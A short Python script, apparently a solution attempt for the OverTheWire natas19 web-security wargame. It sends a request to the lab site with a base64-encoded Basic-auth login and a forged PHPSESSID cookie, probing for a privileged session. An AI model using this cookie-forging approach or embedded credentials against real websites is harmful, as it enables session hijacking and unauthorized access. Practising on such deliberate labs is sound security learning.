import requests
url = "http://natas19.natas.labs.overthewire.org/"
headers = {"Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==" ,"cookie": "PHPSESSID=637"} # ,"cookie": "PHPSESSID=637"

print(requests.get(url, headers=headers).content)